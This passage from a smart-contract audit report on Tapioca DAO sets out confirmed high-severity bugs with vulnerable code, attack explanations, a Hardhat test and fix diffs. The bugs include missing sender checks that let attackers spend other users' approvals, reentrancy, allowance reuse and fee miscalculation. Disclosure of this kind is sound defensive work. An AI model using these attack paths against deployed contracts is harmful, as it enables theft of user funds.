functionmultiHopBuyCollateral(addressfrom,uint256collateralAmount,uint256borrowAmount,IUSDOBase.ILeverageSwapDatacalldataswapData,IUSDOBase.ILeverageLZDatacalldatalzData,IUSDOBase.ILeverageExternalContractsDatacalldataexternalData)externalpayablenotPausedsolvent(from) {...//borrow(,uint256borrowShare) =_borrow(from,from,borrowAmount);+//@audit => Validate that the caller has enough allowance to take the borrow+_allowedBorrow(from,borrowShare);...}
0xRektora (Tapioca) confirmed via duplicate issue 121

[H-55]_sendTokenimplementation inBalancer.solis wrong which will make the underlying erc20 be send to a random address and lost
Submitted byVagner
The function_sendTokenis called onrebalanceto perform the rebalance operation by the owner which will transfer native token or the underlying ERC20 for a specific tOFT token to other chains. This function uses therouterfrom Stargate to transfer the tokens, but the implementation of theswapis done wrong which will make the tokens to be lost.
Proof of Concept
_sendTokencalls Stargate’s routerswapfunction with the all the parameters needed as can be seen herehttps://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/Balancer.sol#L322-L332, but the problem relies that the destination address is computed by callingabi.encode(connectedOFTs[_oft][_dstChainId].dstOft)instead of theabi.encodePacked(connectedOFTs[_oft][_dstChainId].dstOft)https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/Balancer.sol#L316-L318.
Per Stargate documentationhttps://stargateprotocol.gitbook.io/stargate/developers/how-to-swap, the address of the swap need to casted to bytes by usingabi.encodePackedand notabi.encode, casting which is done correctly in the_sendNativefunctionhttps://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/Balancer.sol#L291. The big difference betweenabi.encodePackedandabi.encodeis thatabi.encodewill fill the remaining 12 bytes of casting a 20 bytes address with 0 values. Here is an example of casting the address0x5B38Da6a701c568545dCfcB03FcB875f56beddC4
bytesnormalAbi=0x0000000000000000000000005b38da6a701c568545dcfcb03fcb875f56beddc4;bytespackedAbi=0x5b38da6a701c568545dcfcb03fcb875f56beddc4;
This will hurt the whole logic of theswapsince when thelzReceivefunction on theBridge.solcontract from Startgate will be called, the address where the funds will be sent will be a wrong address. As you can see here thelzReceiveonBridge.solfor Abitrum for example uses assembly to load 20 bytes of thepayloadto thetoAddresshttps://arbiscan.io/address/0x352d8275aae3e0c2404d9f68f6cee084b5beb3dd#code#F1#L88which in our case, for the address that I provided as an example it would be
toAddress=0x0000000000000000000000005b38Da6A701c5685;
becauseabi.encodewas used instead ofabi.ecnodePacked.
Then it will try to swap the tokens to this address, by callingsgReceiveon it, which will not exist in most of the case and the assets will be lost, as specified by Stargate documentationhttps://stargateprotocol.gitbook.io/stargate/composability-stargatecomposed.sol
Recommended Mitigation Steps
Useabi.encodePackedinstead ofabi.encodeon_sendToken, same as the protocol does in_sendNative, so the assumptions will be correct.
0xRektora (Tapioca) confirmed

[H-56] Tokens can be stolen from other users who have approved Magnetar
Submitted bydirk_y, also found byMadalad,bin2chen,kutugu,Ack, 0xStalin (1,2),0xTheC0der, cergyk (1,2),rvierdiiev, anderebus
https://github.com/Tapioca-DAO/tapioca-periph-audit/blob/023751a4e987cf7c203ab25d3abba58f7344f213/contracts/Magnetar/MagnetarV2.sol#L622-L635
https://github.com/Tapioca-DAO/tapioca-periph-audit/blob/023751a4e987cf7c203ab25d3abba58f7344f213/contracts/Magnetar/MagnetarV2Storage.sol#L336-L338
https://github.com/Tapioca-DAO/tapioca-periph-audit/blob/023751a4e987cf7c203ab25d3abba58f7344f213/contracts/Magnetar/modules/MagnetarMarketModule.sol#L70
https://github.com/Tapioca-DAO/tapioca-periph-audit/blob/023751a4e987cf7c203ab25d3abba58f7344f213/contracts/Magnetar/modules/MagnetarMarketModule.sol#L212-L241
https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/MarketERC20.sol#L84-L91
TheMagnetarV2.solcontract is a helper contract that allows users to interact with other parts of the Tapioca ecosystem. In order for Magnetar to be able to perform actions on behalf of a user, the user has to approve the contract as an approved spender (or equivalent) of the relevant tokens in the part of the Tapioca ecosystem the user wants to interact with.
In order to avoid abuse, many of the actions that Magnetar can perform are protected by a check that the owner of the position/token needs to be themsg.senderof the user interacting with Magnetar. However, there are some methods that are callable through Magnetar that don’t have this check. This allows a malicious user to use approvals other users have made to Magnetar to steal their underlying tokens.
Proof of Concept
As I mentioned above, many of the Magnetar methods have a check to ensure that themsg.senderis the “from” address for the subsequent interactions with other parts of the Tapioca ecosystem. This check is performed by the_checkSendermethod:
function _checkSender(address _from) internal view {require(_from == msg.sender, "MagnetarV2: operator not approved");}
This function does what it is designed to do, however there are some methods that don’t include this protection when they should.
One example is theMARKET_BUY_COLLATERALaction that allows a user to buy collateral in a market:
else if (_action.id == MARKET_BUY_COLLATERAL) {HelperBuyCollateral memory data = abi.decode(_action.call[4:],(HelperBuyCollateral));IMarket(data.market).buyCollateral(data.from,data.borrowAmount,data.supplyAmount,data.minAmountOut,address(data.swapper),data.dexData);}
In the market contract there is an underlying call to check whether the sender has the allowance to buy collateral:
function _allowedBorrow(address from, uint share) internal {if (from != msg.sender) {if (allowanceBorrow[from][msg.sender] < share) {revert NotApproved(from, msg.sender);}allowanceBorrow[from][msg.sender] -= share;}}
Since themsg.senderfrom the perspective of the market is Magnetar, the user would need to provide a borrow allowance to Magnetar to perform this action through Magnetar.
However, you can see above in theMARKET_BUY_COLLATERALcode snippet that there is no call to_checkSender. As a result, a malicious user can now pass in an arbitrarydata.fromaddress to use the allowance provided by another user to perform an unauthorised action. In this case, the malicious user could lever up the user’s position to increase the user’s LTV and therefore push the user closer to insolvency; at which point the user can be liquidated for a profit.
Another example of this issue is with thedepositRepayAndRemoveCollateralFromMarketmethod inMagnetarMarketModule.sol. In this instance a malicious user can drain approved tokens from any other user by depositing into the Magnetar yield box:
// deposit to YieldBoxif (depositAmount > 0) {_extractTokens(extractFromSender ? msg.sender : user,assetAddress,depositAmount);IERC20(assetAddress).approve(address(yieldBox), depositAmount);yieldBox.depositAsset(assetId,address(this),address(this),depositAmount,0);}
This is a small snippet from the underlying_depositRepayAndRemoveCollateralFromMarketmethod that doesn’t include a call to_checkSenderand therefore the malicious user can simply setextractFromSenderto false and specify an arbitrary user address.
Recommended Mitigation Steps
The_checkSendermethod should be used in every method inMagnetarV2.solandMagnetarMarketModule.solif it isn’t already.
0xRektora (Tapioca) confirmed via duplicate issue 106

[H-57] twAML::participate - reentrancy via _safeMint can be used to brick reward distribution
Submitted bycergyk
A malicious user can use reentrancy in twAML to brick reward distribution
Proof of Concept
As we can see inparticipatein twAML, the function_safeMintis used to mint the voting position to the user;
However this function executes a callback on the destination contract:onERC721Received, which can then be used to reenter:
// Mint twTAP positiontokenId= ++mintedTWTap;_safeMint(_participant,tokenId);
The_participantcontract can reenter inexitPosition, and release the position since,
require(position.expiry<=block.timestamp,"twTAP: Lock not expired");
position.expiryis not set yet.
However we see that the following effects are executed after_safeMint:
weekTotals[w0 + 1].netActiveVotes += int256(votes);weekTotals[w1 + 1].netActiveVotes -= int256(votes);
And these have a direct impact on reward distribution;
The malicious user can use reentrancy to increaseweekTotals[w0 + 1].netActiveVotesby big amounts without even locking her tokens;
Later when the operator wants to distribute the rewards:
functiondistributeReward(uint256_rewardTokenId,uint256_amount)external{require(lastProcessedWeek==currentWeek(),"twTAP: Advance week first");WeekTotalsstoragetotals=weekTotals[lastProcessedWeek];IERC20rewardToken=rewardTokens[_rewardTokenId];// If this is a DBZ then there are no positions to give the reward to.// Since reward eligibility starts in the week after locking, there is// no way to give out rewards THIS week.// Cast is safe: `netActiveVotes` is at most zero by construction of// weekly totals and the requirement that they are up to date.// TODO: Word this bettertotals.totalDistPerVote[_rewardTokenId] +=(_amount*DIST_PRECISION) /uint256(totals.netActiveVotes);rewardToken.safeTransferFrom(msg.sender,address(this),_amount);}
totals.totalDistPerVote[_rewardTokenId] becomes zero
Recommended Mitigation Steps
Use any of these:
Move effects before _safeMintUse nonReentrant modifier
0xRektora (Tapioca) confirmed

[H-58] A user with a TapiocaOFT allowance >0 could steal all the underlying ERC20 tokens of the owner
Submitted bydirk_y, also found bybin2chen,carrotsmuggler,0x73696d616f, andchaduke
TheTapiocaOFT.solcontract allows users to wrap ERC20 tokens into an OFTV2 type contract to allow for seamless cross-chain use.
As with most ERC20 tokens, owners of tokens have the ability to give an allowance to another address to spend their tokens. This allowance should be decremented every time a user spends the owner’s tokens. However theTapiocaOFT.sol_wrapmethod contains a bug that allows a user with a non-zero allowance to keep using the same allowance to spend the owner’s tokens.
For example, if an owner had 100 tokens and gave an allowance of 10 to a spender, that spender would be able to spend all 100 tokens in 10 transactions.
Proof of Concept
When a user wants to wrap a non-native ERC20 token into a TapiocaOFT they callwrapwhich calls_wrapunder the hood:
function _wrap(address _fromAddress,address _toAddress,uint256 _amount) internal virtual {if (_fromAddress != msg.sender) {require(allowance(_fromAddress, msg.sender) >= _amount,"TOFT_allowed");}IERC20(erc20).safeTransferFrom(_fromAddress, address(this), _amount);_mint(_toAddress, _amount);}
If the sender isn’t the owner of the ERC20 tokens being wrapped, the allowance of the user is checked. However this isn’t checking the underlying ERC20 allowance, but the allowance of the current contract (the TapiocaOFT).
Next, the underlying ERC20 token is transferred from the owner to this address. This decrements the allowance of the sender, however the sender isn’t the original message sender, but this contract.
In order to use this contract as an owner (Alice) I would have to approve theTapiocaOFTcontract to spend my ERC20 tokens, and it is common to approve this contract to spend all my tokens if I trust the contract. Now let’s say I approved another user (Bob) to spend some (let’s say 5) of myTapiocaOFTtokens. Bob can now callwrap(aliceAddress, bobAddress, 5)as many times as he wants to steal all of Alice’s tokens.
Recommended Mitigation Steps
In my opinion you shouldn’t be able to wrap another user’s ERC20 tokens into a different token, because this is a different action to spending. Also, there is no way to decrement the allowance of the user (of the TapiocaOFT token) in the same call as we aren’t actually transferring any tokens; there is no function selector in the ERC20 spec to decrease an allowance from another contract.
Therefore I would suggest the following change:
diff --git a/contracts/tOFT/BaseTOFT.sol b/contracts/tOFT/BaseTOFT.solindex 5658a0a..e8b7f63 100644--- a/contracts/tOFT/BaseTOFT.sol+++ b/contracts/tOFT/BaseTOFT.sol@@ -350,12 +350,7 @@ contract BaseTOFT is BaseTOFTStorage, ERC20Permit {address _toAddress,uint256 _amount) internal virtual {-        if (_fromAddress != msg.sender) {-            require(-                allowance(_fromAddress, msg.sender) >= _amount,-                "TOFT_allowed"-            );-        }+        require (_fromAddress == msg.sender, "TOFT_allowed");IERC20(erc20).safeTransferFrom(_fromAddress, address(this), _amount);_mint(_toAddress, _amount);}
0xRektora (Tapioca) confirmed

[H-59] The BigBang contract take more fees than it should
Submitted by0xRobocop, also found bymojito_auditor,KIntern_NA,xuwinnie, andrvierdiiev
The repay function in the BigBang contract is used for users to repay their loans. The mechanics of the function are simple:
Update the exchange rateAccrue the fees generatedCall internal function _repay
The internal function _repay handles the state changes regarding the user debt. Specifically, fees are taken by withdrawing all the user’s debt from yieldbox and burning the proportion that does not correspond to fees. The fees stay in the contract’s balance to later be taken by the penrose contract. The logic can be seen here:
function_repay(addressfrom,addressto,uint256part)internalreturns(uint256amount) {(totalBorrow,amount) =totalBorrow.sub(part,true);userBorrowPart[to] -=part;uint256toWithdraw= (amount-part);//acrrued// @audit-issue Takes more fees than it shoulduint256toBurn=amount-toWithdraw;yieldBox.withdraw(assetId,from,address(this),amount,0);//burn USDOif(toBurn>0) {IUSDOBase(address(asset)).burn(address(this),toBurn);}emitLogRepay(from,to,amount,part);}
The problem is that the function burns less than it should, hence, taking more fees than it should.
Proof of Concept
I will provide a symbolic proof and coded proof to illustrate the issue. To show the issue clearly we will assume that there is no opening fee, and that the yearly fee is of 10%. Hence, for the coded PoC it is important to change the values ofbigBangEthDebtRateandborrowOpeningFee:
// Penrose contractbigBangEthDebtRate=1e17;// BigBang contractborrowOpeningFee;
Symbolic
How much fees do the protocol should take?. The answer of this question can be represented in the following equation:
ProtocolFees = CurrentUserDebt - OriginalUserDebt
The fees accrued for the protocol is the difference of the current debt of the user and the original debt of the user. If we examine the implementation of the _repay function we found the next:
//uint256 amount;(totalBorrow,amount) =totalBorrow.sub(part,true);userBorrowPart[to] -=part;uint256toWithdraw= (amount-part);//acrrued// @audit-issue Takes more fees than it shoulduint256toBurn=amount-toWithdraw;yieldBox.withdraw(assetId,from,address(this),amount,0);//burn USDOif(toBurn>0) {IUSDOBase(address(asset)).burn(address(this),toBurn);}
The important variables are:
partrepresents the base part of the debt of the useramountis the elastic part that was paid givingpart, elastic means this is the real debt.
At the following line the contract takesamountwhich is the real user debt from yield box:
yieldBox.withdraw(assetId,from,address(this),amount,0);
Then it burns some tokens:
if(toBurn>0) {IUSDOBase(address(asset)).burn(address(this),toBurn);}
But howtoBurnis calculated?:
uint256toWithdraw= (amount-part);//acrrueduint256toBurn=amount-toWithdraw;
toBurnis justpart. Hence, the contract is computing the fees as:
ProtocolFees = amount - part. Rewriting this with the first equation terms will be:
ProtocolFees = CurrentDebt - part.
But it ispartequal toOriginalDebt?. Remember thatpartis not the actual debt, is just the part of the real debt to be paid, this can be found in a comment in the code:
elastic=Totaltokenamounttoberepayedbyborrowers,base=Totalpartsofthedebtheldbyborrowers.
So they are equal only for the first borrower, but for the others this wont be the case since the relation ofelasticandpartwont be 1:1 due to accrued fees, makingpart < OriginalDebt, and hence the protocol taking more fees. Let’s use some number to showcase it better:
TIME = 0First borrower A asks 1,000 units, state:part[A] = 1000total.part = 1000total.elastic = 1000TIME = 1 YEARpart[A] = 1000 --> no change from borrower Atotal.part = 1000 --> no change yettotal.elastic = 1100 --> fees accrued in one year 100 unitsSecond borrower B asks 1,000 units, state:part[B] = 909.09total.part = 1909.09total.elastic = 2100B part was computed as:1000 * 1000 / 1100 = 909.09TIME = 2 YEARFees are accrued, hence:total.elastic = 2100 * 1.1 = 2310.Hence the total fees accrued by the protocol are:2310 - 2000 = 310.These 310 are collected from A and B in the following proportions:A Fee = 210B Fee = 100Borrower B produced 100 units of fees, which makes sense, he asked for 1000 units at 10%/year.
When B repays its debt, he needs to repay 1,100 units. Then the contract burns the proportion that was real debt, the problem as stated above is that the function burns thepartand not the original debt, hence the contract will burn 909.09 units. Hence it took:
1100 - 909.09 = 190.91 units
The contract took 190.91 in fees rather than 100 units.
Coded PoC
Follow the next steps to run the coded PoC:
1.- Make the contract changes described at the beginning.2.- Add the following test undertest/bigBang.test.ts:
describe.only('borrow() & repay() check fees', ()=>{it('should borrow and repay check fees',async()=>{const{wethBigBangMarket,weth,wethAssetId,yieldBox,deployer,bar,usd0,__wethUsdcPrice,timeTravel,eoa1,} =awaitloadFixture(register);awaitweth.approve(yieldBox.address,ethers.constants.MaxUint256);awaityieldBox.setApprovalForAll(wethBigBangMarket.address,true);awaitweth.connect(eoa1).approve(yieldBox.address,ethers.constants.MaxUint256);awaityieldBox.connect(eoa1).setApprovalForAll(wethBigBangMarket.address,true);constwethMintVal=ethers.BigNumber.from((1e18).toString()).mul(10,);awaitweth.freeMint(wethMintVal);awaitweth.connect(eoa1).freeMint(wethMintVal);constvalShare=awaityieldBox.toShare(wethAssetId,wethMintVal,false,);awaityieldBox.depositAsset(wethAssetId,deployer.address,deployer.address,0,valShare,);awaitwethBigBangMarket.addCollateral(deployer.address,deployer.address,false,0,valShare,);awaityieldBox.connect(eoa1).depositAsset(wethAssetId,eoa1.address,eoa1.address,0,valShare,);awaitwethBigBangMarket.connect(eoa1).addCollateral(eoa1.address,eoa1.address,false,0,valShare);//borrowconstusdoBorrowVal=wethMintVal.mul(10).div(100).mul(__wethUsdcPrice.div((1e18).toString()));awaitwethBigBangMarket.borrow(deployer.address,deployer.address,usdoBorrowVal,);constuserBorrowPart=awaitwethBigBangMarket.userBorrowPart(deployer.address,);console.log('User A Borrow Part: '+userBorrowPart);timeTravel(365*86400);awaitwethBigBangMarket.connect(eoa1).borrow(eoa1.address,eoa1.address,usdoBorrowVal);timeTravel(365*86400);consteoa1BorrowPart=awaitwethBigBangMarket.userBorrowPart(eoa1.address,);console.log('User B Borrow Part: '+eoa1BorrowPart);constusd0Extra=ethers.BigNumber.from((1e18).toString()).mul(500);awaitusd0.mint(eoa1.address,usd0Extra);awaitusd0.connect(eoa1).approve(yieldBox.address,usd0Extra);awaityieldBox.connect(eoa1).depositAsset(awaitwethBigBangMarket.assetId(),eoa1.address,eoa1.address,usd0Extra,0,);constcontractusdoB1=awaitusd0.balanceOf(wethBigBangMarket.address,);console.log('Fees before repayment: '+contractusdoB1);// Repayment happensawaitwethBigBangMarket.connect(eoa1).repay(eoa1.address,eoa1.address,false,eoa1BorrowPart);constuserBorrowPartAfter=awaitwethBigBangMarket.userBorrowPart(eoa1.address,);// User paid all its debt.expect(userBorrowPartAfter.eq(0)).to.be.true;constcontractusdoB2=awaitusd0.balanceOf(wethBigBangMarket.address,);console.log('Fees after repayment: '+contractusdoB2);});});
Tools Used
Hardhat
Recommended Mitigation Steps
Not only store the user borrow part but also the original debt which isdebtAsked + openingFee. So, during repayment the contract can compute the real fees generated.
0xRektora (Tapioca) confirmed

[H-60] twTAP.claimAndSendRewards() will claim the wrong amount for each reward token due to the use of wrong index
Submitted bychaduke, also found bybin2chen,KIntern_NA,0xRobocop, andrvierdiiev
Detailed description of the impact of this finding.
twTAP.claimAndSendRewards() will claim the wrong amount for each reward token due to the use of wrong index. As a result, some users will lose some rewards and others will claim more rewards then they deserve.
Proof of Concept
Provide direct links to all referenced code in GitHub. Add screenshots, logs, or any other relevant proof that illustrates the concept.
twTAP.claimAndSendRewards() allows the tapOFT to claim and send a list of rewards indicated in_rewardTokens.
https://github.com/Tapioca-DAO/tap-token-audit/blob/59749be5bc2286f0bdbf59d7ddc258ddafd49a9f/contracts/governance/twTAP.sol#L361-L367
It calls the function_claimRewardsOn()to achieve this:
https://github.com/Tapioca-DAO/tap-token-audit/blob/59749be5bc2286f0bdbf59d7ddc258ddafd49a9f/contracts/governance/twTAP.sol#L499-L519
Unfortunately, at L509, it uses the index ofiinstead of the correct index ofclaimableIndex. As a result, the amount that is claimed and transferred for each reward is wrong.
Tools Used
VSCode
Recommended Mitigation Steps
We need to use indexclaimableIndexinstead ofifor function_claimRewardsOn():
function _claimRewardsOn(uint256 _tokenId,address _to,IERC20[] memory _rewardTokens) internal {uint256[] memory amounts = claimable(_tokenId);unchecked {uint256 len = _rewardTokens.length;for (uint256 i = 0; i < len; ) {uint256 claimableIndex = rewardTokenIndex[_rewardTokens[i]];-                uint256 amount = amounts[i];+                uint256 amount = amounts[claimableIndex];if (amount > 0) {// Math is safe: `amount` calculated safely in `claimable()`claimed[_tokenId][claimableIndex] += amount;rewardTokens[claimableIndex].safeTransfer(_to, amount);}++i;}}}
0xRektora (Tapioca) confirmed

